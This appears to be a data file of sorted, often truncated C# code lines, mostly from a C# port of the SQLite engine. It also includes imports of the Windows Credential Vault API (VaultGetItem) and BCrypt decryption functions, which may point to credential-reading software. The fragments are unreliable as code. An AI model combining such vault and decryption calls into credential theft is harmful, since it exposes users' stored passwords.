"        [DllImport(""vaultcli.dll"")]"
"        [DllImport(""vaultcli.dll"", EntryPoint = ""VaultGetItem"")]"
"        [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]"
"        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]"
"        _base = sqlite3VdbeAddOpList( v, dropTrigger.Length, dropTrigger )"
"        aCounter.CopyTo( ct.aCounter, 0 )"
"        aJournalMagic.CopyTo( zHeader, 0 )"
"        aNew.pSchema = sqlite3SchemaGet( db, aNew.pBt )"
"        aRegIdx, true, -1, false, false )"
"        aSpace, 16)"
"        addr = sqlite3VdbeAddOp0( v, OP_Goto )"
"        addr = sqlite3VdbeAddOp1( v, OP_IfNeg, p.iOffset )"
"        addr = sqlite3VdbeAddOp1( v, OP_IfNot, iMem )"
"        addr = sqlite3VdbeAddOp3( v, OP_RowSetRead, iRowSet, end, iRowid )"
"        addr = sqlite3VdbeAddOp3( v, OP_RowSetRead, regRowSet, 0, regOldRowid )"
"        addr1 = sqlite3VdbeAddOp1( v, OP_IfZero, iLimit )"
"        addr1 = sqlite3VdbeAddOp2( v, OP_NewRowid, iDest, regRowid )"
"        addr1 = sqlite3VdbeAddOp2( v, OP_Rewind, iDest, 0 )"
"        addr1 = sqlite3VdbeAddOp2( v, OP_Rewind, iSrc, 0 )"
"        addr1 = sqlite3VdbeAddOp2( v, OP_Rowid, iSrc, regRowid )"
"        addr2 = sqlite3VdbeAddOp0( v, OP_Goto )"
"        addr2 = sqlite3VdbeAddOp3( v, OP_NotExists, iDest, 0, regRowid )"
"        addrCont = sqlite3VdbeAddOp1( v, OP_Yield, dest.iParm )"
"        addrEofA = sqlite3VdbeAddOp2( v, OP_Goto, 0, labelEnd )"
"        addrEofA = sqlite3VdbeAddOp2( v, OP_If, regEofB, labelEnd )"
"        addrEofB = sqlite3VdbeAddOp2( v, OP_If, regEofA, labelEnd )"
"        addrInsTop = sqlite3VdbeAddOp1( v, OP_If, regEof )"
"        addrInsTop = sqlite3VdbeAddOp1( v, OP_Rewind, srcTab )"
"        addrOutB = generateOutputSubroutine( pParse,"
"        aff = sqlite3CompareAffinity( pExpr.pRight, aff )"
"        aff = sqlite3CompareAffinity( pExpr.x.pSelect.pEList.a[0].pExpr, aff )"
"        analyzeOneTable( pParse, pTab, iStatCur, iMem )"
"        assemblePage(pNew, 1, pCell, szCell)"
"        assemblePage(pNew, cntNew[i] - j, apCell, szCell, j)"
"        autoIncStep( pParse, regAutoinc, regRowid )"
"        bestBtreeIndex( pParse, pWC, pSrc, notReady, pOrderBy, ref pCost )"
"        btreeParseCell( pCur.apPage[iPage], pCur.aiIdx[iPage], ref pCur.info )"
"        btreeParseCell(pCur.apPage[pCur.iPage], pCur.aiIdx[pCur.iPage],"
"        btreeParseCellPtr( pPage, iCell, ref info )"
"        c = ( string.Compare( zNum.Substring( 0, 18 ), ""922337203685477580"" ) == 1 ) "
"        c = string.Compare( zNum, ""922337203685477580"" )"
"        callCollNeeded( db, zName )"
"        case ""MemPage"":"
"        case ""SrcList"":"
"        case ""Token"":"
"        case ""byte[]"":"
"        case ""char"
"        case ""char"":"
"        case ""double"":"
"        case ""i64"":"
"        case ""int"":"
"        case ""int[]"":"
"        case ""long int"":"
"        case ""long"":"
"        case ""longlong int"":"
"        case ""sqlite3_mem_methods"":"
"        case ""string"":"
"        case ""u32"":"
"        case ""u3216"":"
"        case ""u64"":"
"        case ""unsigned int"":"
"        case ""unsigned long int"":"
"        case ""unsigned long"":"
"        case ""void_function"":"
"        case '""': break"
"        case '""':"
"        case ',':"
"        case OE_Cascade: zName = ""CASCADE"""
"        case OE_SetDflt: zName = ""SET DEFAULT"""
"        case OE_SetNull: zName = ""SET NULL"""
"        case SQLITE_BLOB: z = ""blob"""
"        case SQLITE_FLOAT: z = ""real"""
"        case SQLITE_INTEGER: z = ""integer"""
"        case SQLITE_TEXT: z = ""text"""
"        case TK_ALL: z = ""UNION ALL"""
"        case TK_EXCEPT: z = ""EXCEPT"""
"        case TK_INTERSECT: z = ""INTERSECT"""
"        checkAppendMsg(pCheck, zContext, ""2nd reference to page %d"", iPage)"
"        checkAppendMsg(pCheck, zContext, ""Failed to read ptrmap key=%d"", iChild)"
"        checkAppendMsg(pCheck, zContext, ""invalid page number %d"", iPage)"
"        checkAppendMsg(pCheck, zContext,"
"        checkAppendMsg(sCheck, null,"
"        checkColumnOverlap( p.pColumns, pChanges ) != 0 )"
"        checkTreePage(pCheck, pgno, zContext)"
"        checkTreePage(sCheck, aRoot[i], ""List of tree roots: "")"
"        clearSelect( db, p )"
"        cmp = sqlite3MemCompare( pBest, pArg, pColl )"
"        codeApplyAffinity( pParse, regBase, nConstraint, pIdx )"
"        codeDistinct( pParse, distinct, iContinue, nColumn, regResult )"
"        codeOffset( v, p, iContinue )"
"        compound clause made up entirely of non-aggregate queries, and"
"        copyNodeContent(apNew[0], pParent, ref rc)"
"        copyNodeContent(pRoot, pChild, ref rc)"
"        corruptSchema( pData, argv[0], """" )"
"        corruptSchema( pData, null, null )"
"        createMask( pMaskSet, pTabList.a[i].iCursor )"
"        db, ""type='trigger' AND name='%q'"", zName ), P4_DYNAMIC"
"        db.aDb[iDb].zName, SCHEMA_TABLE( iDb ), zName,"
"        db.aDb[iDb].zName, SCHEMA_TABLE( iDb ),"
"        db.aDb[iDb].zName, zMasterName )"
"        db.xCollNeeded( db.pCollNeededArg, db, db.aDb[0].pSchema.enc, zExternal )"
"        db.xProfile( db.pProfileArg, p.zSql, elapseTime )"
"        default: z = ""UNION"""
"        default: z = ""null"""
"        default: zName = ""RESTRICT"""
"        destroyRootPage( pParse, pIndex.tnum, iDb )"
"        disableTerm( pLevel, pRangeEnd )"
"        disableTerm( pLevel, pRangeStart )"
"        dropCell(pLeaf, pLeaf.nCell - 1, nCell, ref rc)"
"        dropCell(pPage, idx, szOld, ref rc)"
"        else Array.Resize( ref pLevel.u._in.aInLoop, pLevel.u._in.nIn )"
"        else if ( Double.IsInfinity( pMem.r ) ) pMem.z = ""Inf"""
"        else if ( Double.IsPositiveInfinity( pMem.r ) ) pMem.z = """
"        else if ( pMem.r.ToString().Contains( ""."" ) ) pMem.z = pMem.r.ToString().ToLower()"
"        else if ( pMem.z != null ) sqlite3AtoF( pMem.z, ref val )"
"        else if ( sqlite3GetInt32( argv[1], ref pIndex.tnum ) == false )"
"        else if ( sqlite3StrICmp( pItem.zDatabase, zDb ) != 0 )"
"        else if ( zErrDyn == """" )"
"        else pMem.z = pMem.z.Substring( 0, n )"
"        else rc = memcmp( pMem1.z, pMem2.zBLOB, ( pMem1.n > pMem2.n ) "
"        emptyDestTest = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 )"
"        escape = sqlite3Utf8Read( zEsc, ref zEsc )"
"        exprAnalyze( pSrc, pWC, idxNew1 )"
"        exprAnalyze( pSrc, pWC, idxNew2 )"
"        exprAnalyze( pTabList, pWC, i )"
"        exprAnalyzeOrTerm( pSrc, pWC, idxTerm )"
"        for ( i = 0, n = 1 "
"        for ( i = 0, pIdx = pTab.pIndex "
"        for ( idx = 1, pIdx = pTab.pIndex "
"        for ( pLoop = pTab.pIndex, n = 1 "
"        for ( pTrig = sqlite3TriggerList( pParse, pTab ) "
"        fprintf( _out, "" "" )"
"        fprintf( _out, "" (rowset)"" )"
"        fprintf( _out, "" NULL"" )"
"        fprintf( _out, "" i:%lld"", p.u.i )"
"        fprintf( _out, "" r:%g"", p.r )"
"        fprintf( _out, "" si:%lld"", p.u.i )"
"        fprintf( _out, ""%s"", zBuf )"
"        fprintf(yyTraceFILE, """
"        fprintf(yyTraceFILE, ""%sAccept!"
"        fprintf(yyTraceFILE, ""%sInput %s"
"        fprintf(yyTraceFILE, ""%sPopping %s"
"        fprintf(yyTraceFILE, ""%sReduce [%s]."
"        fprintf(yyTraceFILE, ""%sShift %d"
"        fprintf(yyTraceFILE, ""%sStack:"", yyTracePrompt)"
"        freePage(apNew[0], ref rc)"
"        freePage(apOld[i], ref rc)"
"        freePage(pPage, ref rc)"
"        generateColumnNames( pParse, null, pFirst.pEList )"
"        generateColumnNames( pParse, pTabList, pEList )"
"        generateSortTail( pParse, p, v, pEList.nExpr, pDest )"
"        got = id.fs.Read( pBuf, 0, amt )"
"        h = strHash( pKey, nKey ) % pH.htsize"
"        heightOfExpr( p.pHaving, ref  pnHeight )"
"        heightOfExpr( p.pLimit, ref  pnHeight )"
"        heightOfExpr( p.pOffset, ref  pnHeight )"
"        heightOfExpr( p.pWhere, ref  pnHeight )"
"        heightOfExprList( p.pEList, ref pnHeight )"
"        heightOfExprList( p.pGroupBy, ref pnHeight )"
"        heightOfExprList( p.pOrderBy, ref  pnHeight )"
"        heightOfExprList( p.x.pList, ref nHeight )"
"        heightOfSelect( p.pPrior, ref  pnHeight )"
"        heightOfSelect( p.x.pSelect, ref nHeight )"
"        i = get2byte(data, hdr "
"        iChild, eType, iParent, ePtrmapType, iPtrmapParent)"
"        iCol = resolveAsName( pParse, pSelect.pEList, pE )"
"        iData = get2byte(aFrom, iFromHdr "
"        iDb = sqlite3FindDb( db, pName1 )"
"        iDb = sqlite3SchemaToIndex( db, pTab.pSchema )"
"        iDb = sqlite3SchemaToIndex( pParse.db, pStep.pTrig.pSchema )"
"        iDb = sqlite3TwoPartName( pParse, pName1, pName2, ref  pName )"
"        iDb = sqlite3TwoPartName( pParse, pName1, pName2, ref  pTableName )"
"        iEndAfterTrigger = sqlite3VdbeAddOp0( v, OP_Goto )"
"        iEndAfterTrigger = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 )"
"        iEndBeforeTrigger = sqlite3VdbeAddOp0( v, OP_Goto )"
"        iEndBeforeTrigger = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 )"
"        iGoto = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 )"
"        iMem,"
"        iReg = sqlite3ExprCodeTarget( pParse, pX.pRight, iTarget )"
"        iRowidReg = codeEqualityTerm( pParse, pTerm, pLevel, iReleaseReg )"
"        iTrunk = sqlite3Get4byte(pPage1.aData, 32)"
"        id.fs.Write( pBuf, 0, amt )"
"        identPut( zStmt, ref k, pCol.zName )"
"        idxNew1 = whereClauseInsert( pWC, pNewExpr1, TERM_VIRTUAL "
"        idxNew2 = whereClauseInsert( pWC, pNewExpr2, TERM_VIRTUAL "
"        if ( !ExprHasProperty( p, EP_Reduced ) "
"        if ( !ExprHasProperty( pB, EP_IntValue ) "
"        if ( !xferCompatibleCollation( pDest.aCol[i].zColl, pSrc.aCol[i].zColl ) )"
"        if ( !xferCompatibleCollation( pSrc.azColl[i], pDest.azColl[i] ) )"
"        if ( ( TESTBIT( pV, i ) ) != sqlite3BitvecTest( pBitvec, (u32)i ) )"
"        if ( ( exprTableUsage( pMaskSet, pList.a[iFirst"
"        if ( ( rc = sqlite3PagerAcquire( pPager, (u32)pgno, ref pPg, 1 ) ) != SQLITE_OK )"
"        if ( ( sqlite3MemCompare( argv[iBest], argv[i], pColl ) "
"        if ( 0 == okOnePass ) sqlite3OpenTable( pParse, iCur, iDb, pTab, OP_OpenWrite )"
"        if ( 0 == sqlite3StrICmp( z, ""exclusive"" ) ) return PAGER_LOCKINGMODE_EXCLUSIVE"
"        if ( 0 == sqlite3StrICmp( z, ""normal"" ) ) return PAGER_LOCKINGMODE_NORMAL"
"        if ( 0 == sqlite3StrICmp( z, p.aCol[i].zName ) )"
"        if ( 0 == sqlite3StrICmp( z, zColl ) )"
"        if ( DbHasProperty( db, i, DB_SchemaLoaded ) "
"        if ( Double.IsNegativeInfinity( pMem.r ) ) pMem.z = ""-Inf"""
"        if ( ExprHasAnyProperty( pExpr, EP_TokenOnly ) ) break"
"        if ( ExprHasProperty( p, EP_xIsSelect ) )"
"        if ( ExprHasProperty( pB, EP_IntValue ) "
"        if ( ExprHasProperty( pExpr, EP_IntValue ) )"
"        if ( ExprHasProperty( pExpr, EP_xIsSelect ) )"
"        if ( NEVER( r1 != r2 ) ) sqlite3ReleaseTempReg( pParse, r1 )"
"        if ( SQLITE_OK != ( rc = read32bits( pPager.jfd, iHdrOff "
"        if ( SQLITE_OK != sqlite3CheckObjectName( pParse, zName ) )"
"        if ( SQLITE_OK == ( rc = sqlite3PagerGet( pDestPager, iDest, ref pDestPg ) )"
"        if ( SQLITE_OK == sqlite3ValueFromExpr( db, pExpr.pLeft, enc, affinity, ref pVal ) )"
"        if ( flattenSubquery( pParse, p, i, isAgg, isAggSub ) != 0 )"
"        if ( getDigits( zDate.Substring( zIndex ), 2, 0, 59, '"
"        if ( memcmp( aMagic, aJournalMagic, aMagic.Length ) != 0 )"
"        if ( p != null ) sqlite3StatusAdd( SQLITE_STATUS_SCRATCH_OVERFLOW, n )"
"        if ( pC == null ) { zSp = """""
"        if ( pMem.z == null ) pMem.z = """""
"        if ( pMem.zBLOB != null ) sqlite3AtoF( Encoding.UTF8.GetString( pMem.zBLOB ), ref val )"
"        if ( pMem1.zBLOB != null ) rc = memcmp( pMem1.zBLOB, pMem2.zBLOB, ( pMem1.n > pMem2.n ) "
"        if ( pPager.zFilename.Length==0) pPager.zJournal = """""
"        if ( pStr1 != null ) pStr1.u.zToken = pStr1.u.zToken.Substring( 0, nPattern )"
"        if ( rehash( ref  pH, pH.count "
"        if ( sqlite3CodeRowTrigger( pParse, pTrigger, TK_INSERT, null, TRIGGER_AFTER,"
"        if ( sqlite3CodeRowTrigger( pParse, pTrigger, TK_INSERT, null, TRIGGER_BEFORE,"
"        if ( sqlite3CodeRowTrigger( pParse, pTrigger, TK_UPDATE, pChanges, TRIGGER_AFTER, pTab,"
"        if ( sqlite3CodeRowTrigger( pParse, pTrigger, TK_UPDATE, pChanges,"
"        if ( sqlite3ExprCompare( pEList.a[i].pExpr, pE ) )"
"        if ( sqlite3ExprIsInteger( pE, ref iCol ) != 0 )"
"        if ( sqlite3FindIndex( db, zName, null ) != null "
"        if ( sqlite3FindIndex( db, zName, pDb.zName ) != null )"
"        if ( sqlite3FindTable( db, ""sqlite_stat1"", db.aDb[iDb].zName ) != null )"
"        if ( sqlite3FitsIn64Bits( z, negFlag ) )"
"        if ( sqlite3FixExpr( pFix, pExpr.pRight ) != 0 )"
"        if ( sqlite3FixExpr( pFix, pItem.pExpr ) != 0 )"
"        if ( sqlite3FixExpr( pFix, pItem.pOn ) != 0 ) return 1"
"        if ( sqlite3FixExpr( pFix, pSelect.pHaving ) != 0 )"
"        if ( sqlite3FixExpr( pFix, pSelect.pWhere ) != 0 )"
"        if ( sqlite3FixExpr( pFix, pStep.pWhere ) != 0 )"
"        if ( sqlite3FixExprList( pFix, pSelect.pEList ) != 0 )"
"        if ( sqlite3FixExprList( pFix, pStep.pExprList ) != 0 )"
"        if ( sqlite3FixInit( sFix, pParse, iDb, ""index"", pName ) != 0 "
"        if ( sqlite3FixSelect( pFix, pItem.pSelect ) != 0 ) return 1"
"        if ( sqlite3FixSelect( pFix, pStep.pSelect ) != 0 )"
"        if ( sqlite3FixSrcList( pFix, pSelect.pSrc ) != 0 )"
"        if ( sqlite3IdListIndex( pIdList, pEList.a[e].zName ) >= 0 ) return 1"
"        if ( sqlite3IndexedByLookup( pParse, pFrom ) != 0 )"
"        if ( sqlite3ResolveExprNames( pNC, ref pE ) != 0 )"
"        if ( sqlite3ResolveExprNames( sNC, ref p.pCheck ) != 0 )"
"        if ( sqlite3ResolveExprNames( sNC, ref p.pLimit ) != 0 "
"        if ( sqlite3ResolveExprNames( sNC, ref p.pWhere ) != 0 "
"        if ( sqlite3ResolveExprNames( sNC, ref pChanges.a[i].pExpr ) != 0 )"
"        if ( sqlite3StrICmp( pA.u.zToken, pB.u.zToken ) != 0 )"
"        if ( sqlite3StrICmp( pDb.zName, zName ) == 0 ) break"
"        if ( sqlite3StrICmp( pList.a[i].zName, zName ) == 0 ) return i"
"        if ( sqlite3StrICmp( pTab.aCol[i].zName, zCol ) == 0 ) return i"
"        if ( sqlite3StrICmp( z, zName ) == 0 )"
"        if ( sqlite3StrICmp( zLeft, ""page_size"" ) == 0 )"
"        if ( sqlite3StrICmp( zLeft, p.zName ) == 0 )"
"        if ( sqlite3StrNICmp( p.zName, zFunc, nFunc ) == 0 "
"        if ( sqlite3Utf8CharLen( zEsc, -1 ) != 1 )"
"        if ( sqlite3ValueFromExpr( db, pDflt, SQLITE_UTF8, SQLITE_AFF_NONE, ref pVal ) != 0 )"
"        if ( sqlite3VdbeChangeEncoding( pMem, SQLITE_UTF8 ) != 0"
"        if ( sqlite3VdbeMemGrow( pMem, (int)nAlloc, 0 ) != 0 )"
"        if ( sqlite3VdbeMemGrow( pMem, 32, 0 ) != 0 )"
"        if ( sqlite3VdbeOpcodeHasProperty( opcode, OPFLG_JUMP ) "
"        if ( sqlite3WalkExpr( pWalker, ref pExpr.pLeft ) != 0 ) return WRC_Abort"
"        if ( sqlite3WalkExpr( pWalker, ref pExpr.pRight ) != 0 ) return WRC_Abort"
"        if ( sqlite3WalkSelectExpr( pWalker, p ) != 0 ) return WRC_Abort"
"        if ( sqlite3WalkSelectFrom( pWalker, p ) != 0 ) return WRC_Abort"
"        if ( zFilename == "":memory:"" )//if( strcmp(zFilename,"":memory:"")==null )"
"        if ( zIdent[j] == '""' ) { if ( i == z.Length ) z.Append( '"
"        if ( z[n] == (byte)'""' ) { n"
"        if (PTRMAP_ISPAGE(pBt, nOrig) "
"        if (btreeGetPage(pBt, 1, ref pPage1, 0) == SQLITE_OK)"
"        if (checkRef(pCheck, (u32)iPage, zContext) != 0) break"
"        if (decodeFlags(pPage, data[hdr]) != 0)"
"        if (memcmp(page1, 21, """
"        if (memcmp(page1, zMagicHeader, 16) != 0)"
"        if (sqlite3PagerGet(pCheck.pPager, (Pgno)iPage, ref pOvflPage) != 0)"
"        if( sqlite3StrNICmp(""hidden"", zType, 6)"
"        insertCell(pPage, iCellIdx, pNext_4, nCell "
"        insertCell(pParent, pParent.nCell, pSpace, pOut, //(int)(pOut-pSpace),"
"        insertElement( pH, new_ht[h], elem )"
"        insertElement( pH, null, new_elem )"
"        insertElement( pH, pH.ht[h], new_elem )"
"        int a1 = sqlite3VdbeAddOp1( v, OP_NotNull, regOldRowid )"
"        int addr1, addr2"
"        int i, j"
"        int iCell = findCell(pPage, i)"
"        int iCell = findCell(pPage, pPage.nCell - 1)"
"        int iFirst, mx"
"        int iGoto = sqlite3VdbeAddOp0( v, OP_Goto )"
"        int iSpace = MIN( nWrite, JOURNAL_CHUNKSIZE - iChunkOffset )"
"        int iTrigDb = sqlite3SchemaToIndex( pParse.db, pTrig.pSchema )"
"        int idxNew1, idxNew2"
"        int j, k"
"        int j1, j2"
"        int j1, j2, j3, j4, j5"
"        int lwr, upr"
"        int nCopy = MIN( nRead, ( JOURNAL_CHUNKSIZE - iChunkOffset ) )"
"        int nField, nByte"
"        int pCell = findCell(pPage, i)"
"        int pc, addr"
"        int pnext, psize, x"
"        int rc = 0, j1"
"        int rc = sqlite3BtreeCursorHasMoved( p.pCursor, ref hasMoved )"
"        int rc = sqlite3_overload_function( db, ""MATCH"", 2 )"
"        int reg1, reg2, reg3"
"        int score = matchQuality( p, nArg, enc )"
"        internal static extern uint BCryptDecrypt(IntPtr hKey,"
"        internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags)"
"        invalidateIncrblobCursors(p, nKey, 0)"
"        invalidateIncrblobCursors(p, pCur.info.nKey, 0)"
"        j1 = sqlite3VdbeAddOp1( v, OP_If, reg3 )"
"        j1 = sqlite3VdbeAddOp1( v, OP_IfNot, regPrev )"
"        j1 = sqlite3VdbeAddOp1( v, OP_NotNull, memId "
"        j1 = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 )"
"        j1 = sqlite3VdbeAddOp3( v, OP_Ge, r2, 0, r1 )"
"        j1 = sqlite3VdbeAddOp3( v, OP_NotExists, iCur, 0, regOldRowid )"
"        j2 = sqlite3VdbeAddOp0( v, OP_Rewind )"
"        j2 = sqlite3VdbeAddOp4( v, OP_Compare, pIn.iMem, regPrev "
"        j3 = sqlite3VdbeAddOp3( v, OP_Column, 0, 0, iRec )"
"        j3 = sqlite3VdbeAddOp4( v, OP_IsUnique, baseCur "
"        j4 = sqlite3VdbeAddOp3( v, OP_Eq, memId - 1, 0, iRec )"
"        j5 = sqlite3VdbeAddOp0( v, OP_Goto )"
"        lockingStrategy.UnlockFile( pFile, PENDING_BYTE, 1 )"
"        lockingStrategy.UnlockFile( pFile, SHARED_FIRST, SHARED_SIZE )"
"        locktype, newLocktype )"
"        mallocWithAlarm( n, ref p )"
"        mask = getMask( pMaskSet, p.iTable )"
"        n = mallocWithAlarm( n, ref p )"
"        n = sqlite3GetVarint( p, offset, ref v64 )"
"        nByte = dupedExprNodeSize( p, flags )"
"        nCell = cellSizePtr(pLeaf, pCell)"
"        nCell = get2byte(data, hdr "
"        nEq, inMultiplier, nRow, cost )"
"        nFree = sqlite3Get4byte(pBt.pPage1.aData, 36)"
"        nFreeList = sqlite3Get4byte(pBt.pPage1.aData, 36)"
"        nIdx = sqlite3OpenTableAndIndices( pParse, pTab, baseCur, OP_OpenWrite )"
"        nLeaf = sqlite3Get4byte(pTrunk.aData, 4)"
"        nRef, sqlite3PagerRefcount(pBt.pPager)"
"        newIdx, oldIdx, onError, addr, ref old_col_mask, ref new_col_mask ) != 0 )"
"        nextPage = sqlite3Get4byte(aPayload, pCur.info.nLocal "
"        notReady = codeOneLoopStart( pWInfo, i, wctrlFlags, notReady )"
"        null, pPage.pgno, ref rc)"
"        oldCell = findCell(pPage, idx)"
"        p = (Index)sqlite3HashFind( pSchema.idxHash, zName, nName )"
"        p = (Index)sqlite3HashInsert( ref pIndex.pSchema.idxHash,"
"        p = (Table)sqlite3HashFind( db.aDb[j].pSchema.tblHash, zName, nName )"
"        p = fetchPayload( pCur, ref pAmt, ref outOffset, false )"
"        p = fetchPayload( pCur, ref pAmt, ref outOffset, true )"
"        p = functionSearch( pHash, h, zName, nName )"
"        p = pcacheMergeDirtyList( p, a[i] )"
"        p = sqlite3BtreeSchema( pBt, -1, (dxFreeSchema)sqlite3SchemaFree )"
"        p = sqlite3FindCollSeq( db, ENC( db ), zName, 0 )"
"        p = sqlite3GlobalConfig.pcache.xCreate( nByte, pCache.bPurgeable "
"        p, destB, pDest, regOutB,"
"        p.pDest = findBtree( pDestDb, pDestDb, zDestDb )"
"        p.pEntry = rowSetMerge( p.pEntry, pHead )"
"        p.pGroupBy = sqlite3ExprListDup( db, p.pEList, 0 )"
"        p.pRight = rowSetNDeepTree( ref pList, iDepth )"
"        p.pSrc = findBtree( pDestDb, pSrcDb, zSrcDb )"
"        p.rc = sqlite3ApiExit( p.db, p.rc )"
"        p.zErrMsg = """""
"        p.zName,"
"        pBt.autoVacuum = (sqlite3Get4byte(page1, 36 "
"        pBt.incrVacuum = (sqlite3Get4byte(page1, 36 "
"        pBt.pageSize = (u16)get2byte(zDbHeader, 16)"
"        pCell = findCell(pLeaf, pLeaf.nCell - 1)"
"        pCol.affinity, ref pValue )"
"        pColl = findCollSeqEntry( db, zName, create )"
"        pColl = sqlite3ExprCollSeq( pParse, p )"
"        pColl = sqlite3ExprCollSeq( pParse, pExpr )"
"        pColl = sqlite3ExprCollSeq( pParse, pLeft )"
"        pColl = sqlite3FindCollSeq( db, ENC( db ), zColl, 0 )"
"        pColl = sqlite3GetCollSeq( db, pColl, zName )"
"        pColl = sqlite3LocateCollSeq( pParse, zColl )"
"        pColl2 = sqlite3FindCollSeq( db, aEnc[i], z, 0 )"
"        pDb.zName, SCHEMA_TABLE( iDb ), pTab.zName )"
"        pDb.zName, zWhere"
"        pDestDb, SQLITE_ERROR, ""source and destination must be distinct"""
"        pDup = sqlite3ExprDup( db, pOrig, 0 )"
"        pDup = sqlite3PExpr( pParse, TK_AS, pDup, null, null )"
"        pDup = sqlite3SelectNew( pParse, null, pFrom, pWhere, null, null, null, 0, null, null )"
"        pEList = sqlite3ExprListAppend( pParse, null, sqlite3Expr( db, TK_ALL, null ) )"
"        pEnd = findTerm( pWC, iCur, -1, notReady, WO_LT "
"        pEntry = rowSetMerge( pEntry, aBucket[i] )"
"        pExpr.pLeft = substExpr( db, pExpr.pLeft, iTable, pEList )"
"        pExpr.pRight = substExpr( db, pExpr.pRight, iTable, pEList )"
"        pF.pFunc, P4_FUNCDEF )"
"        pFile.fs.Lock( offset, length )"
"        pFile.fs.Unlock( offset, length )"
"        pFrom = sqlite3SrcListAppend( db, null, null, null )"
"        pIdxKey = sqlite3VdbeRecordUnpack(pCur.pKeyInfo, (int)nKey, pKey,"
"        pIndex = sqlite3FindIndex( db, argv[0], db.aDb[iDb].zName )"
"        pIndex.zName, sqlite3Strlen30( pIndex.zName ),"
"        pIndex.zName,"
"        pItem.pExpr = sqlite3ExprDup( db, pOldExpr, flags )"
"        pItem.zAlias = sqlite3NameFromToken( db, pAlias )"
"        pItem.zName = pName.z.Substring( 0, pName.n )"
"        pItem.zSpan = pSpan.zStart.Substring( 0, pSpan.zStart.Length <= pSpan.zEnd.Length "
"        pKey = sqlite3IndexKeyinfo( pParse, pDestIdx )"
"        pKey = sqlite3IndexKeyinfo( pParse, pSrcIdx )"
"        pKey, P4_KEYINFO_HANDOFF )"
"        pKeyInfo = keyInfoFromExprList( pParse, p.pEList )"
"        pKeyInfo = keyInfoFromExprList( pParse, pOrderBy )"
"        pKeyInfo, P4_KEYINFO_HANDOFF )"
"        pKeyInfo, p4type )"
"        pList = sqlite3ExprListAppend( pParse, null, null )"
"        pList.a[i].pExpr = substExpr( db, pList.a[i].pExpr, iTable, pEList )"
"        pMem.u.pRowSet = new RowSet( db, 5 )"
"        pMem.z = """""
"        pNew = sqlite3SelectDup( db, p, 0 )"
"        pNewExpr1 = sqlite3PExpr( pParse, TK_GE, sqlite3ExprDup( db, pLeft, 0 ), pStr1, null )"
"        pNewExpr2 = sqlite3PExpr( pParse, TK_LT, sqlite3ExprDup( db, pLeft, 0 ), pStr2, null )"
"        pNewItem.pOn = sqlite3ExprDup( db, pOldItem.pOn, flags )"
"        pNewItem.pSelect = sqlite3SelectDup( db, pOldItem.pSelect, flags )"
"        pNewItem.pUsing = sqlite3IdListDup( db, pOldItem.pUsing )"
"        pOld = (Table)sqlite3HashInsert( ref pSchema.tblHash, p.zName,"
"        pOrderBy.iECursor, pOrderBy.nExpr "
"        pPage = btreePageLookup(pBt, iPage)"
"        pPage = sqlite3GlobalConfig.pcache.xFetch( pCache.pCache, pgno, 2 )"
"        pPage = sqlite3GlobalConfig.pcache.xFetch( pCache.pCache, pgno, eCreate )"
"        pPage.nCell = (u16)(get2byte(data, hdr "
"        pPager.zFilename = """""
"        pParse.cookieGoto = sqlite3VdbeAddOp2( v, OP_Goto, 0, 0 ) "
"        pParse.nTab, pParse.explain )"
"        pParse.regRoot,"
"        pParse.sLastToken.n = sqlite3GetToken( zSql, i, ref tokenType )"
"        pParse.zErrMsg = """""
"        pRC = freePage2(pPage.pBt, pPage, pPage.pgno)"
"        pRet = multiSelectCollSeq( pParse, p.pPrior, iCol )"
"        pRet = sqlite3ExprCollSeq( pParse, p.pEList.a[iCol].pExpr )"
"        pRight = findCell(pParent, i "
"        pSelTab = sqlite3ResultSetOfSelect( pParse, pSel )"
"        pStart = findTerm( pWC, iCur, -1, notReady, WO_GT "
"        pStr1 = sqlite3Expr( db, TK_STRING, pRight.u.zToken )"
"        pStr2 = sqlite3ExprDup( db, pStr1, 0 )"
"        pTab = sqlite3LocateTable( pParse, 0, pTblName.a[0].zName,"
"        pTab, newIdx, -1, onError, endOfLoop, ref Ref0_1, ref Ref0_2 ) != 0 )"
"        pTab.pCheck = sqlite3ExprAnd( db, pTab.pCheck, pCheckExpr )"
"        pTab.zName,"
"        pTabList, 0, pTab.nCol - nHidden, nColumn )"
"        pTable = sqlite3FindTable( db, zName, db.aDb[iDb].zName )"
"        pTerm = findTerm( pWC, iCur, -1, notReady, WO_EQ "
"        pTerm = findTerm( pWC, iCur, -1, notReady, WO_LT "
"        pTerm = findTerm( pWC, iCur, k, notReady, pLevel.plan.wsFlags, pIdx )"
"        pTerm.prereqRight = exprTableUsage( pMaskSet, pExpr.pRight )"
"        pTrig = (Trigger)sqlite3HashInsert( ref pHash, zName, sqlite3Strlen30( zName ), pTrig )"
"        pTrig.table, z )"
"        pTrigger = (Trigger)sqlite3HashFind( ( db.aDb[j].pSchema.trigHash ), zName, nName )"
"        pTrigger = sqlite3TriggerList( pParse, pTab )"
"        pTriggerStep.pExprList = sqlite3ExprListDup( db, pEList, EXPRDUP_REDUCE )"
"        pTriggerStep.pSelect = sqlite3SelectDup( db, pSelect, EXPRDUP_REDUCE )"
"        pTriggerStep.pWhere = sqlite3ExprDup( db, pWhere, EXPRDUP_REDUCE )"
"        pWInfo = sqlite3WhereBegin( pParse, pTabList, pWhere, ref elDummy, WHERE_DUPLICATES_OK )"
"        pWInfo = sqlite3WhereBegin( pParse, pTabList, pWhere, ref pOrderBy, 0 )"
"        pWInfo.iContinue, pWInfo.iBreak )"
"        pWhere = sqlite3ExprDup( db, pWhere, 0 )"
"        pageSize = get2byte(page1, 16)"
"        pager_end_transaction( pPager, 0 )"
"        pbegin = get2byte(data, hdr "
"        pc = (u16)get2byte(data, hdr "
"        pc = get2byte(data, pAddr)"
"        pcache1TruncateUnsafe( pCache, iLimit )"
"        pgno = (int)sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"        pgno = sqlite3Get4byte(pPage.aData, findCell(pPage, pCur.aiIdx[pCur.iPage]))"
"        pgno = sqlite3Get4byte(pPage.aData, pPage.hdrOffset "
"        pnext = get2byte(data, pbegin)"
